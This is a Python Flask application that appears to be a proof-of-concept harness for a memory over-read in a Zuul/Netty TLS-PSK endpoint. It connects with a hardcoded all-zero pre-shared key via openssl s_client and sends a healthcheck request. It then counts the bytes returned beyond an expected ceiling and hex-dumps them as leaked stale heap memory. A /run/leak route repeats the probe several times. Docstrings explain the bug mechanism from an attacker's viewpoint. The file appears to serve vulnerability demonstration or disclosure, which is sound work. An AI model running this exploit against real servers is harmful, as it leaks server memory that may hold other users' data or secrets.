from __future__ import annotations

import os
import subprocess
import time

from flask import Flask, Response, jsonify, render_template

app = Flask(__name__)

ZUUL_HOST = os.environ.get("ZUUL_HOST", "zuul")
ZUUL_PSK_PORT = int(os.environ.get("ZUUL_PSK_PORT", "7002"))
PROBE_COUNT = int(os.environ.get("PROBE_COUNT", "10"))

POC_PSK = bytes(32)          # 32 zero bytes — matches HardcodedPskProvider.POC_PSK
PSK_IDENTITY = "poc-client"

# A correct HTTP/1.1 200 response to /healthcheck is:
#   HTTP/1.1 200 OK\r\n + headers + \r\n + "healthy" = well under 512 bytes.
# Any bytes received above this ceiling are stale pooled memory from the Netty heap chunk.
EXPECTED_CEILING = 512

# The HTTP request sent on every probe — 84 bytes.
HTTP_REQUEST = (
    b"GET /healthcheck HTTP/1.1\r\n"
    b"Host: zuul\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


def _openssl_probe(send_http: bool) -> dict:
    """
    Run openssl s_client with TLS 1.2 PSK.

    Key flags:
      -ign_eof   keep reading from the server until it closes the connection,
                 even after stdin reaches EOF.  Without this flag, openssl exits
                 the moment it finishes writing stdin, before the server sends
                 the (over-read, oversized) response.  This is why previous
                 versions captured 0 bytes.

    Returns {"ok": bool, "stdout": bytes, "stderr": str, "elapsed_ms": int}.
    """
    cmd = [
        "openssl", "s_client",
        "-connect", f"{ZUUL_HOST}:{ZUUL_PSK_PORT}",
        "-tls1_2",
        "-psk",          POC_PSK.hex(),
        "-psk_identity", PSK_IDENTITY,
        "-cipher",       "PSK-AES128-CBC-SHA",
        "-quiet",
        "-ign_eof",      # wait for server close — critical for capturing the full response
    ]

    started = time.monotonic()
    try:
        proc = subprocess.run(
            cmd,
            input=HTTP_REQUEST if send_http else b"",
            capture_output=True,
            timeout=20,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return {
            "ok": False,
            "error": "openssl timed out — server did not close the connection",
            "elapsed_ms": 20000,
        }
    except Exception as exc:
        return {"ok": False, "error": str(exc), "elapsed_ms": 0}

    elapsed_ms = int((time.monotonic() - started) * 1000)
    stderr = proc.stderr.decode("utf-8", errors="replace")
    stdout = proc.stdout

    # exit 0 = clean close, exit 1 = peer sent close_notify — both are normal.
    handshake_failed = (
        "handshake failure" in stderr.lower()
        or "ssl handshake" in stderr.lower()
        or proc.returncode not in (0, 1)
    )
    if handshake_failed:
        return {"ok": False, "error": stderr.strip(), "elapsed_ms": elapsed_ms}

    if send_http and len(stdout) == 0:
        return {
            "ok": False,
            "error": "handshake ok but zero bytes received — server closed without responding",
            "elapsed_ms": elapsed_ms,
        }

    return {"ok": True, "stdout": stdout, "stderr": stderr, "elapsed_ms": elapsed_ms}


def run_raw_probe(index: int) -> dict:
    """
    One PSK connection.  Sends HTTP_REQUEST, reads back everything the server
    sends before closing.

    With -Dio.netty.noPreferDirect=true:
      - ByteBuf.hasArray() is true
      - TlsPskUtils.getAppDataBytesAndRelease returns byteBufMsg.array()
        which is the FULL Netty heap pool chunk (e.g. 2048 bytes), not the
        7-byte "healthy" response
      - writeApplicationData encrypts the whole chunk
      - The attacker receives all of it after decryption

    overflow_bytes = bytes_received - EXPECTED_CEILING is the measurable proof.
    tail_hex shows the stale memory bytes that followed the real HTTP response.
    """
    result = {"index": index, "ok": False}

    r = _openssl_probe(send_http=True)
    result["elapsed_ms"] = r.get("elapsed_ms", 0)

    if not r["ok"]:
        result["error"] = r.get("error", "unknown")
        return result

    stdout = r["stdout"]
    bytes_received = len(stdout)
    overflow = max(0, bytes_received - EXPECTED_CEILING)
    first_line = stdout.split(b"\r\n", 1)[0].decode("utf-8", errors="replace") if stdout else ""

    result["ok"] = True
    result["request_size_bytes"] = len(HTTP_REQUEST)
    result["bytes_received"] = bytes_received
    result["expected_ceiling_bytes"] = EXPECTED_CEILING
    result["overflow_bytes"] = overflow
    result["overflow_detected"] = overflow > 0
    # Show the last 128 bytes as hex — these are the stale pool bytes, not part of the response
    result["tail_hex"] = stdout[-128:].hex() if len(stdout) > 128 else stdout.hex()
    result["response_first_line"] = first_line
    return result


# ── Routes ────────────────────────────────────────────────────────────────────

@app.get("/")
def index() -> str:
    return render_template(
        "index.html",
        zuul_host=ZUUL_HOST,
        zuul_psk_port=ZUUL_PSK_PORT,
        probe_count=PROBE_COUNT,
    )


@app.post("/run/handshake")
def run_handshake() -> tuple[Response, int]:
    """Complete a real TLS 1.2 PSK handshake without sending HTTP data."""
    r = _openssl_probe(send_http=False)
    if r["ok"]:
        return jsonify({
            "ok": True,
            "bytes_received": 0,
            "response_first_line": "TLS-PSK handshake completed",
            "elapsed_ms": r["elapsed_ms"],
        }), 200
    return jsonify({"ok": False, "error": r.get("error", "unknown")}), 500


@app.post("/run/leak")
def run_leak() -> tuple[Response, int]:
    results = [run_raw_probe(i + 1) for i in range(PROBE_COUNT)]
    ok_results = [r for r in results if r.get("ok")]
    total_overflow = sum(r.get("overflow_bytes", 0) for r in ok_results)
    max_overflow = max((r.get("overflow_bytes", 0) for r in ok_results), default=0)

    return jsonify({
        "ok": True,
        "probe_count": len(results),
        "successes": len(ok_results),
        "failures": len(results) - len(ok_results),
        "total_overflow_bytes": total_overflow,
        "max_overflow_bytes": max_overflow,
        "results": results,
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")))